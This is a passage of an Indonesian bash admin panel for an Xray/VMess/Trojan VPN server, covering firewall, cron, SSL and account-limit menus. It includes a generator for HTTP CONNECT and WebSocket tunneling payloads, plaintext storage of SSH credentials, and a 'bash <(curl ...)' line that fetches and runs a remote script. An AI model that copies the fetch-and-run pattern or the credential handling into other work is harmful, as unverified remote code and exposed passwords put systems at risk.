    read -rp "  Tekan Enter untuk kembali..."



}







_adv_ddos_protection() {



    clear



    local W; W=$(get_width); local MW=$(( W - 4 ))



    _mini_top $MW



 _mini_center $MW "${YELLOW}${BOLD} DDOS PROTECTION${NC}"



    _mini_divider $MW



    detect_firewall_backend



    _mini_left $MW "Backend : ${CYAN}${FW_BACKEND}${NC}"



    _mini_divider $MW



    _mini_two $MW "[1] Aktifkan DDoS Filter " "[2] Lihat Statistik  "



    _mini_two $MW "[3] Reset Rules          " "[0] Back             "



    _mini_bottom $MW



    echo ""; read -rp "  Select: " c



    case $c in



        1)



            sysctl -w net.ipv4.tcp_syncookies=1 >/dev/null 2>&1



            local ipt="iptables"



            [[ "$FW_BACKEND" == "nftables" ]] && command -v iptables-legacy >/dev/null 2>&1 && ipt="iptables-legacy"



            $ipt -A INPUT -p tcp ! --syn -m state --state NEW -j DROP 2>/dev/null



            $ipt -A INPUT -p tcp --dport 443 -m connlimit --connlimit-above 80 -j REJECT 2>/dev/null



            echo -e "  ${GREEN}✔ DDoS Protection AKTIF!${NC}"; sleep 3 ;;



        2) clear; iptables -L -n -v 2>/dev/null | head -30; echo ""; read -rp "  Tekan Enter..." ;;



        3) for c in INPUT FORWARD OUTPUT DDOS-RULES DDOS-PORTSCAN; do iptables -F "$c" 2>/dev/null || true; done; echo -e "  ${YELLOW}Rules direset (chain-safe).${NC}"; sleep 2 ;;



    esac



}







_adv_firewall() {



    clear



    local W; W=$(get_width); local MW=$(( W - 4 ))



    _mini_top $MW



 _mini_center $MW "${YELLOW}${BOLD} FIREWALL RULES (UFW)${NC}"



    _mini_divider $MW



    if command -v ufw >/dev/null 2>&1; then



        local ufw_status; ufw_status=$(ufw status 2>/dev/null | head -1)



        _mini_left $MW "Status : ${CYAN}${ufw_status}${NC}"



        _mini_divider $MW



        while IFS= read -r line; do



            _mini_left $MW "$line"



        done < <(ufw status numbered 2>/dev/null | tail -n +4 | head -10)



        _mini_divider $MW



        _mini_two $MW "[1] Enable UFW  " "[2] Disable UFW "



        _mini_two $MW "[3] Allow Port  " "[0] Back        "



    else



        _mini_left $MW "${RED}UFW belum terinstall${NC}"



        _mini_divider $MW



        _mini_two $MW "[1] Install UFW " "[0] Back        "



    fi



    _mini_bottom $MW



    echo ""; read -rp "  Select: " c



    case $c in



        1)



            if command -v ufw >/dev/null 2>&1; then



                ufw allow 22/tcp >/dev/null 2>&1; ufw allow 443/tcp >/dev/null 2>&1



                echo "y" | ufw enable >/dev/null 2>&1; echo -e "  ${GREEN}✔ UFW Enabled!${NC}"



            else



                apt-get install -y ufw >/dev/null 2>&1; echo -e "  ${GREEN}✔ UFW terinstall!${NC}"



            fi; sleep 2 ;;



        2) ufw disable >/dev/null 2>&1; echo -e "  ${YELLOW}UFW Disabled${NC}"; sleep 2 ;;



        3) read -rp "  Port (contoh: 8080): " port



           [[ -n "$port" ]] && ufw allow "$port" >/dev/null 2>&1 && echo -e "  ${GREEN}✔ Port $port dibuka!${NC}"



           sleep 2 ;;



    esac



}







_adv_bandwidth_monitor() {



    clear



    local W; W=$(get_width); local MW=$(( W - 4 ))



    _mini_top $MW



 _mini_center $MW "${YELLOW}${BOLD}BANDWIDTH MONITOR${NC}"



    _mini_divider $MW



    if command -v vnstat >/dev/null 2>&1; then



        while IFS= read -r line; do



            _mini_left $MW "$line"



        done < <(vnstat 2>/dev/null | head -20 || echo "  Belum ada data")



    else



        _mini_left $MW "${RED}vnstat belum terinstall${NC}"



        _mini_divider $MW



        _mini_two $MW "[1] Install vnstat " "[0] Back          "



    fi



    _mini_bottom $MW



    echo ""



    if ! command -v vnstat >/dev/null 2>&1; then



        read -rp "  Select: " c



        if [[ "$c" == "1" ]]; then



            apt-get install -y vnstat >/dev/null 2>&1



            systemctl enable vnstat >/dev/null 2>&1; systemctl start vnstat >/dev/null 2>&1



            echo -e "  ${GREEN}✔ vnstat terinstall!${NC}"



        fi



    fi



    read -rp "  Tekan Enter untuk kembali..."



}







_adv_user_limits() {



    clear



    local W; W=$(get_width); local MW=$(( W - 4 ))



    _mini_top $MW



 _mini_center $MW "${YELLOW}${BOLD} USER IP LIMITS${NC}"



    _mini_divider $MW



    shopt -s nullglob



    local files=("$AKUN_DIR"/*.txt)



    shopt -u nullglob



    if [[ ${#files[@]} -gt 0 ]]; then



        _mini_left $MW "${WHITE}Akun         Proto      IP Limit${NC}"



        _mini_divider $MW



        for f in "${files[@]}"; do



            local fname proto uname limit



            fname=$(basename "$f" .txt)



            proto=${fname%%-*}; uname=${fname#*-}



            limit=$(grep "IPLIMIT" "$f" 2>/dev/null | cut -d= -f2)



            _mini_two $MW "${GREEN}${uname}${NC}" "${CYAN}${proto}${NC}  ${YELLOW}${limit:-N/A} IP${NC}"



        done



    else



        _mini_left $MW "${RED}Tidak ada akun aktif!${NC}"



    fi



    _mini_divider $MW



    _mini_two $MW "[1] Update limit akun " "[0] Back             "



    _mini_bottom $MW



    echo ""; read -rp "  Select: " c



    [[ "$c" == "1" ]] && {



        read -rp "  Nama akun (contoh: vmess-user1): " akun



        read -rp "  IP Limit baru: " newlimit



        if [[ -f "$AKUN_DIR/${akun}.txt" && "$newlimit" =~ ^[0-9]+$ ]]; then



            sed -i "s/IPLIMIT=.*/IPLIMIT=${newlimit}/" "$AKUN_DIR/${akun}.txt"



            echo -e "  ${GREEN}✔ Updated: ${newlimit} IP${NC}"



        else



            echo -e "  ${RED}✘ Tidak ditemukan!${NC}"



        fi



        sleep 2



    }



}







_adv_custom_payload() {



    local PAYLOAD_DIR="/root/payloads"



    mkdir -p "$PAYLOAD_DIR"



    while true; do



        clear



        local W; W=$(get_width); local MW=$(( W - 4 ))



        [[ -f "$DOMAIN_FILE" ]] && DOMAIN=$(tr -d '\n\r' < "$DOMAIN_FILE" | xargs)



        [[ -z "$DOMAIN" ]] && DOMAIN="(belum diset)"



        _mini_top $MW



        _mini_center $MW "${YELLOW}${BOLD}CUSTOM PAYLOAD GENERATOR${NC}"



        _mini_divider $MW



        _mini_left $MW "${DIM}Domain: ${CYAN}${DOMAIN}${NC}"



        _mini_divider $MW



        _mini_row $MW "[1]  WebSocket Payload" "[2]  CONNECT Payload"



        _mini_row $MW "[3]  HTTP Custom Format" "[4]  Custom Payload Baru"



        _mini_divider $MW



        _mini_row $MW "[5]  Lihat Payload Tersimpan" "[6]  Hapus Payload"



        _mini_divider $MW



        _mini_left $MW "[0]  Kembali"



        _mini_bottom $MW



        echo ""



        read -rp "  Pilih [0-6]: " pl_choice



        case $pl_choice in



            1) _gen_ws_payload "$PAYLOAD_DIR" ;;



            2) _gen_connect_payload "$PAYLOAD_DIR" ;;



            3) _gen_hc_format "$PAYLOAD_DIR" ;;



            4) _gen_custom_payload "$PAYLOAD_DIR" ;;



            5) _view_payloads "$PAYLOAD_DIR" ;;



            6) _delete_payload "$PAYLOAD_DIR" ;;



            0) return ;;



        esac



    done



}







_gen_ws_payload() {



    local PD="$1"



    clear



    local W; W=$(get_width); local MW=$(( W - 4 ))



    [[ -f "$DOMAIN_FILE" ]] && DOMAIN=$(tr -d '\n\r' < "$DOMAIN_FILE" | xargs)



    if [[ -z "$DOMAIN" ]]; then



        echo -e "  ${RED}✘ Domain belum diset! Set domain dulu di menu utama.${NC}"



        echo ""; read -rp "  Tekan Enter untuk kembali..."; return



    fi



    _mini_top $MW



    _mini_center $MW "${YELLOW}${BOLD}WEBSOCKET PAYLOAD${NC}"



    _mini_divider $MW



    echo ""



    echo -e "  ${CYAN}Pilih path WebSocket:${NC}"



    echo -e "  ${DIM}1. /vmess (VMess WS)${NC}"



    echo -e "  ${DIM}2. /vless (VLess WS)${NC}"



    echo -e "  ${DIM}3. /trojan (Trojan WS)${NC}"



    echo -e "  ${DIM}4. / (Root path)${NC}"



    echo -e "  ${DIM}5. Custom path${NC}"



    echo ""



    read -rp "  Pilih path [1-5]: " ws_path



    case $ws_path in



        1) WSPATH="/vmess" ;;



        2) WSPATH="/vless" ;;



        3) WSPATH="/trojan" ;;



        4) WSPATH="/" ;;



        5) read -rp "  Masukkan path (contoh: /custom): " WSPATH



           [[ -z "$WSPATH" ]] && { echo -e "  ${RED}✘ Path tidak boleh kosong!${NC}"; sleep 1; return; } ;;



        *) echo -e "  ${RED}✘ Pilihan tidak valid!${NC}"; sleep 1; return ;;



    esac



    echo ""



    read -rp "  Nama payload (tanpa spasi): " pname



    [[ -z "$pname" ]] && pname="ws_payload"



    pname=$(echo "$pname" | tr -d ' ')



    local FILE="$PD/${pname}.txt"



    cat > "$FILE" << PAYEOF



GET ${WSPATH} HTTP/1.1[crlf]Host: ${DOMAIN}[crlf]Upgrade: websocket[crlf]Connection: Upgrade[crlf][crlf]



PAYEOF



    echo ""



    echo -e "  ${GREEN}✔ WebSocket payload tersimpan:${NC}"



    echo -e "  ${DIM}${FILE}${NC}"



    echo ""



    _mini_top $MW



    _mini_left $MW "${CYAN}PAYLOAD:${NC}"



    _mini_left $MW "${GREEN}GET ${WSPATH} HTTP/1.1[crlf]${NC}"



    _mini_left $MW "${GREEN}Host: ${DOMAIN}[crlf]${NC}"



    _mini_left $MW "${GREEN}Upgrade: websocket[crlf]${NC}"



    _mini_left $MW "${GREEN}Connection: Upgrade[crlf][crlf]${NC}"



    _mini_bottom $MW



    echo ""; read -rp "  Tekan Enter untuk kembali..."



}







_gen_connect_payload() {



    local PD="$1"



    clear



    local W; W=$(get_width); local MW=$(( W - 4 ))



    [[ -f "$DOMAIN_FILE" ]] && DOMAIN=$(tr -d '\n\r' < "$DOMAIN_FILE" | xargs)



    if [[ -z "$DOMAIN" ]]; then



        echo -e "  ${RED}✘ Domain belum diset!${NC}"



        echo ""; read -rp "  Tekan Enter untuk kembali..."; return



    fi



    _mini_top $MW



    _mini_center $MW "${YELLOW}${BOLD}HTTP CONNECT PAYLOAD${NC}"



    _mini_divider $MW



    echo ""



    echo -e "  ${CYAN}Pilih port tujuan:${NC}"



    echo -e "  ${DIM}1. 443 (HTTPS/WebSocket)${NC}"



    echo -e "  ${DIM}2. 80 (HTTP)${NC}"



    echo -e "  ${DIM}3. 8080 (VMess WS)${NC}"



    echo -e "  ${DIM}4. 8081 (VLess WS)${NC}"



    echo -e "  ${DIM}5. 8082 (Trojan WS)${NC}"



    echo -e "  ${DIM}6. Custom port${NC}"



    echo ""



    read -rp "  Pilih port [1-6]: " cp_port



    case $cp_port in



        1) CPORT=443 ;;



        2) CPORT=80 ;;



        3) CPORT=8080 ;;



        4) CPORT=8081 ;;



        5) CPORT=8082 ;;



        6) read -rp "  Masukkan port: " CPORT



           [[ -z "$CPORT" || ! "$CPORT" =~ ^[0-9]+$ ]] && { echo -e "  ${RED}✘ Port tidak valid!${NC}"; sleep 1; return; } ;;



        *) echo -e "  ${RED}✘ Pilihan tidak valid!${NC}"; sleep 1; return ;;



    esac



    echo ""



    read -rp "  Nama payload (tanpa spasi): " pname



    [[ -z "$pname" ]] && pname="connect_payload"



    pname=$(echo "$pname" | tr -d ' ')



    local FILE="$PD/${pname}.txt"



    cat > "$FILE" << PAYEOF



CONNECT ${DOMAIN}:${CPORT} HTTP/1.1[crlf]Host: ${DOMAIN}:${CPORT}[crlf][crlf]



PAYEOF



    echo ""



    echo -e "  ${GREEN}✔ CONNECT payload tersimpan:${NC}"



    echo -e "  ${DIM}${FILE}${NC}"



    echo ""



    _mini_top $MW



    _mini_left $MW "${CYAN}PAYLOAD:${NC}"



    _mini_left $MW "${GREEN}CONNECT ${DOMAIN}:${CPORT} HTTP/1.1[crlf]${NC}"



    _mini_left $MW "${GREEN}Host: ${DOMAIN}:${CPORT}[crlf][crlf]${NC}"



    _mini_bottom $MW



    echo ""; read -rp "  Tekan Enter untuk kembali..."



}







_gen_hc_format() {



    local PD="$1"



    clear



    local W; W=$(get_width); local MW=$(( W - 4 ))



    [[ -f "$DOMAIN_FILE" ]] && DOMAIN=$(tr -d '\n\r' < "$DOMAIN_FILE" | xargs)



    if [[ -z "$DOMAIN" ]]; then



        echo -e "  ${RED}✘ Domain belum diset!${NC}"



        echo ""; read -rp "  Tekan Enter untuk kembali..."; return



    fi



    _mini_top $MW



    _mini_center $MW "${YELLOW}${BOLD}HTTP CUSTOM FORMAT${NC}"



    _mini_divider $MW



    echo ""



    echo -e "  ${DIM}Format: ${CYAN}domain:port@user:pass${NC}"



    echo ""



    read -rp "  Masukkan port (default 80): " hc_port



    [[ -z "$hc_port" ]] && hc_port=80



    read -rp "  Username SSH: " hc_user



    read -rp "  Password SSH: " hc_pass



    [[ -z "$hc_user" ]] && hc_user="username"



    [[ -z "$hc_pass" ]] && hc_pass="password"



    read -rp "  Nama payload (tanpa spasi): " pname



    [[ -z "$pname" ]] && pname="hc_payload"



    pname=$(echo "$pname" | tr -d ' ')



    local FILE="$PD/${pname}.txt"



    echo "${DOMAIN}:${hc_port}@${hc_user}:${hc_pass}" > "$FILE"



    echo ""



    echo -e "  ${GREEN}✔ HTTP Custom format tersimpan:${NC}"



    echo -e "  ${DIM}${FILE}${NC}"



    echo ""



    _mini_top $MW



    _mini_left $MW "${CYAN}FORMAT HC:${NC}"



    _mini_left $MW "${GREEN}${DOMAIN}:${hc_port}@${hc_user}:${hc_pass}${NC}"



    _mini_bottom $MW



    echo ""; read -rp "  Tekan Enter untuk kembali..."



}







_gen_custom_payload() {



    local PD="$1"



    clear



    local W; W=$(get_width); local MW=$(( W - 4 ))



    _mini_top $MW



    _mini_center $MW "${YELLOW}${BOLD}CUSTOM PAYLOAD${NC}"



    _mini_divider $MW



    _mini_left $MW "${DIM}Masukkan payload sendiri.${NC}"



    _mini_left $MW "${DIM}Gunakan [crlf] untuk baris baru.${NC}"



    _mini_bottom $MW



    echo ""



    echo -e "  ${CYAN}Contoh:${NC}"



    echo -e "  ${DIM}GET / HTTP/1.1[crlf]Host: example.com[crlf][crlf]${NC}"



    echo ""



    read -rp "  Nama payload (tanpa spasi): " pname



    [[ -z "$pname" ]] && { echo -e "  ${RED}✘ Nama tidak boleh kosong!${NC}"; sleep 1; return; }



    pname=$(echo "$pname" | tr -d ' ')



    echo ""



    echo -e "  ${YELLOW}Tulis payload (akhiri dengan . saja untuk selesai):${NC}"



    echo ""



    local TEMP_PAYLOAD=""



    while IFS= read -r line; do



        [[ "$line" == "." ]] && break



        TEMP_PAYLOAD+="${line}"$'\n'



    done



    TEMP_PAYLOAD=$(echo "$TEMP_PAYLOAD" | sed '/^$/d')



    if [[ -z "$TEMP_PAYLOAD" ]]; then



        echo -e "  ${RED}✘ Payload tidak boleh kosong!${NC}"; sleep 1; return



    fi



    local FILE="$PD/${pname}.txt"



    echo "$TEMP_PAYLOAD" > "$FILE"



    echo ""



    echo -e "  ${GREEN}✔ Custom payload tersimpan:${NC}"



    echo -e "  ${DIM}${FILE}${NC}"



    echo ""



    local W2; W2=$(get_width); local MW2=$(( W2 - 4 ))



    _mini_top $MW2



    _mini_left $MW2 "${CYAN}CUSTOM PAYLOAD:${NC}"



    echo "$TEMP_PAYLOAD" | while IFS= read -r pl; do



        _mini_left $MW2 "${GREEN}${pl}${NC}"



    done



    _mini_bottom $MW2



    echo ""; read -rp "  Tekan Enter untuk kembali..."



}







_view_payloads() {



    local PD="$1"



    clear



    local W; W=$(get_width); local MW=$(( W - 4 ))



    _mini_top $MW



    _mini_center $MW "${YELLOW}${BOLD}PAYLOAD TERSIMPAN${NC}"



    _mini_divider $MW



    if [[ ! -d "$PD" ]] || ! ls "$PD"/*.txt &>/dev/null; then



        _mini_left $MW "${RED}Belum ada payload tersimpan.${NC}"



    else



        local i=1



        for f in "$PD"/*.txt; do



            [[ -f "$f" ]] || continue



            local fname=$(basename "$f")



            echo -e "  ${CYAN}${i}.${NC} ${fname}"



            i=$((i+1))



        done



    fi



    _mini_divider $MW



    _mini_left $MW "${DIM}Ketik nomor untuk melihat isi payload${NC}"



    _mini_bottom $MW



    echo ""



    read -rp "  Pilih nomor [0 untuk kembali]: " vp_choice



    [[ "$vp_choice" == "0" || -z "$vp_choice" ]] && return



    local idx=1



    for f in "$PD"/*.txt; do



        [[ -f "$f" ]] || continue



        if [[ "$idx" -eq "$vp_choice" ]]; then



            clear



            local W2; W2=$(get_width); local MW2=$(( W2 - 4 ))



            local fname=$(basename "$f")



            _mini_top $MW2



            _mini_center $MW2 "${CYAN}${BOLD}${fname}${NC}"



            _mini_divider $MW2



            while IFS= read -r line; do



                _mini_left $MW2 "${GREEN}${line}${NC}"



            done < "$f"



            _mini_bottom $MW2



            echo ""; read -rp "  Tekan Enter untuk kembali..."



            return



        fi



        idx=$((idx+1))



    done



    echo -e "  ${RED}✘ Nomor tidak valid!${NC}"



    sleep 1



}







_delete_payload() {



    local PD="$1"



    clear



    local W; W=$(get_width); local MW=$(( W - 4 ))



    _mini_top $MW



    _mini_center $MW "${YELLOW}${BOLD}HAPUS PAYLOAD${NC}"



    _mini_divider $MW



    if [[ ! -d "$PD" ]] || ! ls "$PD"/*.txt &>/dev/null; then



        _mini_left $MW "${RED}Belum ada payload tersimpan.${NC}"



        _mini_bottom $MW



        echo ""; read -rp "  Tekan Enter untuk kembali..."; return



    fi



    local i=1



    for f in "$PD"/*.txt; do



        [[ -f "$f" ]] || continue



        local fname=$(basename "$f")



        echo -e "  ${CYAN}${i}.${NC} ${fname}"



        i=$((i+1))



    done



    _mini_divider $MW



    _mini_bottom $MW



    echo ""



    read -rp "  Nomor payload yang akan dihapus [0 batal]: " del_choice



    [[ "$del_choice" == "0" || -z "$del_choice" ]] && return



    local idx=1



    for f in "$PD"/*.txt; do



        [[ -f "$f" ]] || continue



        if [[ "$idx" -eq "$del_choice" ]]; then



            rm -f "$f"



            echo -e "  ${GREEN}✔ ${YELLOW}$(basename "$f")${GREEN} dihapus.${NC}"



            echo ""; read -rp "  Tekan Enter untuk kembali..."; return



        fi



        idx=$((idx+1))



    done



    echo -e "  ${RED}✘ Nomor tidak valid!${NC}"



    sleep 1



}



_adv_cron_jobs() {



    clear



    local W; W=$(get_width); local MW=$(( W - 4 ))



    _mini_top $MW



 _mini_center $MW "${YELLOW}${BOLD}CRON JOBS MANAGER${NC}"



    _mini_divider $MW



    local cron_list; cron_list=$(crontab -l 2>/dev/null)



    if [[ -n "$cron_list" ]]; then



        while IFS= read -r line; do



            _mini_left $MW "${CYAN}${line}${NC}"



        done <<< "$cron_list"



    else



        _mini_left $MW "${YELLOW}Belum ada cron job aktif${NC}"



    fi



    _mini_divider $MW



    _mini_two $MW "[1] Auto hapus expired " "[2] Auto restart xray"



    _mini_two $MW "[3] Hapus semua cron   " "[0] Back             "



    _mini_bottom $MW



    echo ""; read -rp "  Select: " c



    case $c in



        1) # Hapus cron expired lama dulu, pasang yang baru (tiap jam)



           (crontab -l 2>/dev/null | grep -v "delete_expired_cron";             echo "0 * * * * bash /root/vpn.sh delete_expired_cron 2>/dev/null") | crontab -



           echo -e "  ${GREEN}✔ Auto-hapus expired aktif! (tiap jam tepat)${NC}"; sleep 2 ;;



        2) (crontab -l 2>/dev/null; echo "0 4 * * * systemctl restart xray >/dev/null 2>&1") | crontab -



           echo -e "  ${GREEN}✔ Auto-restart Xray aktif!${NC}"; sleep 2 ;;



        3) crontab -l 2>/dev/null | grep -v "delete_expired\|restart xray\|xray\|tunnel.sh\|vpn.sh\|vpn-" | crontab - 2>/dev/null; echo -e "  ${YELLOW}Cron VPN dihapus!${NC}"; sleep 2 ;;



    esac



}







_adv_system_logs() {



    while true; do



        clear



        local W; W=$(get_width); local MW=$(( W - 4 ))



        _mini_top $MW



 _mini_center $MW "${YELLOW}${BOLD}SYSTEM LOGS VIEWER${NC}"



        _mini_divider $MW



        _mini_two $MW "[1] Xray Access Log  " "[2] Xray Error Log  "



        _mini_two $MW "[3] Nginx Error Log  " "[4] SSH Auth Log    "



        _mini_two $MW "[5] System Journal   " "[0] Back            "



        _mini_bottom $MW



        echo ""; read -rp "  Select: " log_choice



        [[ "$log_choice" == "0" ]] && return



        clear



        case $log_choice in



            1) echo -e "${CYAN}=== Xray Access Log ===${NC}"



               tail -50 /var/log/xray/access.log 2>/dev/null || echo "  No logs" ;;



            2) echo -e "${CYAN}=== Xray Error Log ===${NC}"



               tail -50 /var/log/xray/error.log 2>/dev/null || echo "  No logs" ;;



            3) echo -e "${CYAN}=== Nginx Error Log ===${NC}"



               tail -50 /var/log/nginx/error.log 2>/dev/null || echo "  No logs" ;;



            4) echo -e "${CYAN}=== SSH Auth Log ===${NC}"



               tail -50 /var/log/auth.log 2>/dev/null || echo "  No logs" ;;



            5) echo -e "${CYAN}=== System Journal ===${NC}"



               journalctl -n 50 --no-pager ;;



        esac



        echo ""; read -rp "  Tekan Enter untuk kembali ke menu logs..."



    done



}











#================================================



# FITUR BARU: SSL INFO & AUTO-RENEW CHECK



#================================================







_adv_ssl_info() {



    clear



    local W; W=$(get_width)



    [[ -f "$DOMAIN_FILE" ]] && DOMAIN=$(tr -d '\n\r' < "$DOMAIN_FILE" | xargs)



    _box_top $W



    _box_center $W "${YELLOW}${BOLD}SSL CERTIFICATE INFO${NC}"



    _box_divider $W



    if [[ -f "/etc/xray/xray.crt" ]]; then



        local issuer subject start_date end_date days_left



        issuer=$(openssl x509 -in /etc/xray/xray.crt -noout -issuer 2>/dev/null | sed 's/issuer=//')



        subject=$(openssl x509 -in /etc/xray/xray.crt -noout -subject 2>/dev/null | sed 's/subject=//')



        start_date=$(openssl x509 -in /etc/xray/xray.crt -noout -startdate 2>/dev/null | sed 's/notBefore=//')



        end_date=$(openssl x509 -in /etc/xray/xray.crt -noout -enddate 2>/dev/null | sed 's/notAfter=//')



        local end_ts today_ts



        end_ts=$(date -d "$end_date" +%s 2>/dev/null)



        today_ts=$(date +%s)



        days_left=$(( (end_ts - today_ts) / 86400 ))



        local color_days="$GREEN"



        [[ $days_left -lt 30 ]] && color_days="$YELLOW"



        [[ $days_left -lt 7  ]] && color_days="$RED"



        _box_left $W "Domain   : ${GREEN}${DOMAIN}${NC}"



        _box_left $W "Issuer   : ${CYAN}${issuer}${NC}"



        _box_left $W "Subject  : ${WHITE}${subject}${NC}"



        _box_left $W "Valid    : ${WHITE}${start_date}${NC}"



        _box_left $W "Expire   : ${WHITE}${end_date}${NC}"



        _box_left $W "Sisa     : ${color_days}${days_left} hari${NC}"



        _box_divider $W



        if [[ $days_left -lt 30 ]]; then



            _box_left $W "${YELLOW}⚠ Cert akan segera expired! Jalankan Fix SSL [11]${NC}"



        else



            _box_left $W "${GREEN}✔ Cert masih valid${NC}"



        fi



        # Cek apakah Let's Encrypt ada auto-renew cron



        if crontab -l 2>/dev/null | grep -q "certbot\|renew"; then



            _box_left $W "${GREEN}✔ Auto-renew: AKTIF${NC}"



        elif [[ -f /etc/cron.d/certbot ]] || [[ -f /etc/systemd/system/certbot.timer ]]; then



            _box_left $W "${GREEN}✔ Auto-renew: AKTIF (systemd)${NC}"



        else



            _box_left $W "${YELLOW}⚠ Auto-renew: tidak terdeteksi${NC}"



        fi



    else



        _box_left $W "${RED}✘ Certificate tidak ditemukan!${NC}"



        _box_left $W "Jalankan Fix SSL / Cert [11] dari menu utama."



    fi



    _box_bottom $W



    echo ""



    echo -e "  ${WHITE}[1]${NC} Force renew cert sekarang  ${WHITE}[0]${NC} Kembali"



    read -rp "  Select: " c



    if [[ "$c" == "1" ]]; then



        echo -e "  ${CYAN}Renewing cert...${NC}"



        systemctl stop nginx 2>/dev/null



        certbot renew --force-renewal --standalone -d "$DOMAIN" \
            --non-interactive --agree-tos 2>/dev/null



        if [[ -f "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" ]]; then



            cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /etc/xray/xray.crt



            cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /etc/xray/xray.key



            chmod 644 /etc/xray/xray.*



            echo -e "  ${GREEN}✔ Cert berhasil diperbarui!${NC}"



        fi



        systemctl start nginx 2>/dev/null



        systemctl restart xray 2>/dev/null



        sleep 3



    fi



}







#================================================



# FITUR BARU: IP WHITELIST SSH



#================================================







_adv_ip_whitelist() {



    while true; do



        clear



        local W; W=$(get_width)



        _box_top $W



        _box_center $W "${YELLOW}${BOLD}IP WHITELIST SSH${NC}"



        _box_divider $W



        _box_left $W "${WHITE}IP yang diizinkan login SSH:${NC}"



        _box_divider $W



        if grep -q "AllowUsers\|Match Address\|AllowFrom" /etc/ssh/sshd_config 2>/dev/null || \
           [[ -f /etc/hosts.allow ]]; then



            while IFS= read -r line; do



                _box_left $W "${CYAN}${line}${NC}"



            done < <(grep -E "AllowUsers|Match.*Address" /etc/ssh/sshd_config 2>/dev/null)



            echo ""



            _box_left $W "${WHITE}hosts.allow:${NC}"



            while IFS= read -r line; do



                [[ "$line" =~ ^# ]] && continue; [[ -z "$line" ]] && continue



                _box_left $W "${GREEN}${line}${NC}"



            done < /etc/hosts.allow 2>/dev/null



        else



            _box_left $W "${YELLOW}Semua IP diizinkan (tidak ada whitelist)${NC}"



        fi



        _box_divider $W



        _box_row $W "[1] Tambah IP whitelist" "[2] Reset (izinkan semua)"



        _box_left $W "[0] Kembali"



        _box_bottom $W



        echo ""



        read -rp "  Select: " c



        case $c in



            1)



                read -rp "  Masukkan IP (contoh: 103.87.12.0/24): " wip



                if [[ -n "$wip" ]]; then



                    echo "sshd: ${wip}" >> /etc/hosts.allow



                    echo "sshd: ALL" >> /etc/hosts.deny



                    echo -e "  ${GREEN}✔ IP ${wip} ditambahkan!${NC}"



                    sleep 2



                fi ;;



            2)



                sed -i '/^sshd:/d' /etc/hosts.allow 2>/dev/null



                sed -i '/^sshd: ALL/d' /etc/hosts.deny 2>/dev/null



                echo -e "  ${GREEN}✔ Whitelist direset, semua IP diizinkan.${NC}"



                sleep 2 ;;



            0) return ;;



        esac



    done



}







#================================================



# FITUR BARU: QUOTA MONITOR



#================================================







_adv_quota_monitor() {



    clear



    local W; W=$(get_width)



    _box_top $W



    _box_center $W "${YELLOW}${BOLD}QUOTA USAGE MONITOR${NC}"



    _box_divider $W



    _box_row $W "USERNAME" "QUOTA/EXPIRED/STATUS"



    _box_divider $W







    local today; today=$(date +%s)



    local found=0



    shopt -s nullglob



    for f in "$AKUN_DIR"/*.txt; do



        [[ ! -f "$f" ]] && continue



        found=1



        local fname uname proto exp_str exp_ts quota iplimit days_left status color



        fname=$(basename "$f" .txt)



        proto=${fname%%-*}; uname=${fname#*-}



        exp_str=$(grep "EXPIRED=" "$f" 2>/dev/null | head -1 | cut -d= -f2-)



        quota=$(grep "^QUOTA=" "$f" 2>/dev/null | cut -d= -f2)



        iplimit=$(grep "^IPLIMIT=" "$f" 2>/dev/null | cut -d= -f2)



        local exp_str_clean="${exp_str//,/}"



        exp_ts=$(date -d "$exp_str_clean" +%s 2>/dev/null)



        if [[ -n "$exp_ts" ]]; then



            days_left=$(( (exp_ts - today) / 86400 ))



            if [[ $days_left -lt 0 ]]; then



                status="EXPIRED"; color="$RED"



            elif [[ $days_left -le 3 ]]; then



                status="${days_left}d warning"; color="$YELLOW"



            else



                status="${days_left}d left"; color="$GREEN"



            fi



        else



            status="?"; color="$DIM"



        fi



        local left_str="${proto^^} ${uname}"



        local right_str="${quota:-?}GB | ${color}${status}${NC}"



        _box_row $W "$left_str" "${quota:-?}GB | ${days_left:-?}d | ${status}"



    done



    shopt -u nullglob



    [[ $found -eq 0 ]] && _box_center $W "${YELLOW}Tidak ada akun aktif${NC}"



    _box_divider $W



    # Disk usage



    local disk_info; disk_info=$(df -h / | awk 'NR==2{print $3"/"$2" ("$5")"}')



    _box_left $W "Disk Usage : ${CYAN}${disk_info}${NC}"



    # RAM



    local ram_used ram_total



    ram_used=$(free -m | awk '/Mem:/{print $3}')



    ram_total=$(free -m | awk '/Mem:/{print $2}')



    _box_left $W "RAM Usage  : ${CYAN}${ram_used}/${ram_total} MB${NC}"



    # Uptime



    _box_left $W "Uptime     : ${CYAN}$(uptime -p | sed 's/up //')${NC}"



    _box_bottom $W



    echo ""



    read -rp "  Tekan Enter untuk kembali..."



}







#================================================



# UNINSTALL MENU



#================================================







menu_uninstall() {



    while true; do



        clear; print_menu_header "UNINSTALL MENU"



        echo -e "  ${WHITE}[1]${NC} Uninstall Xray       ${WHITE}[5]${NC} Uninstall UDP Custom"



        echo -e "  ${WHITE}[2]${NC} Uninstall Nginx      ${WHITE}[6]${NC} Uninstall Bot Telegram"



        echo -e "  ${WHITE}[3]${NC} Uninstall HAProxy    ${WHITE}[7]${NC} Uninstall Keepalive"



        echo -e "  ${WHITE}[4]${NC} Uninstall Dropbear   ${RED}[8]${NC} ${RED}HAPUS SEMUA SCRIPT${NC}"



        echo -e "  ${WHITE}[0]${NC} Back To Menu"



        echo ""



        read -rp "  Select: " choice



        case $choice in



            1) _uninstall_xray ;; 2) _uninstall_nginx ;;



            3) _uninstall_haproxy ;; 4) _uninstall_dropbear ;;



            5) _uninstall_udp ;; 6) _uninstall_bot ;;



            7) _uninstall_keepalive ;; 8) _uninstall_all ;;



            0) return ;;



        esac



    done



}







_uninstall_xray() {



    clear; print_menu_header "UNINSTALL XRAY"



    read -rp "  Yakin? [y/n]: " c; [[ "$c" != "y" ]] && return



    systemctl stop xray 2>/dev/null; systemctl disable xray 2>/dev/null



    bash <(curl -Ls https://github.com/XTLS/Xray-install/raw/main/install-release.sh) --remove >/dev/null 2>&1



    # Validasi path aman sebelum rm -rf



    if [[ -n "${XRAY_CONFIG%%/config.json}" && -d "${XRAY_CONFIG%%/config.json}" ]]; then



        rm -rf /usr/local/etc/xray /var/log/xray /etc/xray



    else



        echo -e "  ${YELLOW}⚠ Path Xray tidak valid, skip penghapusan manual.${NC}"



    fi



    echo -e "  ${GREEN}✔ Xray uninstalled!${NC}"; sleep 2



}







_uninstall_nginx() {



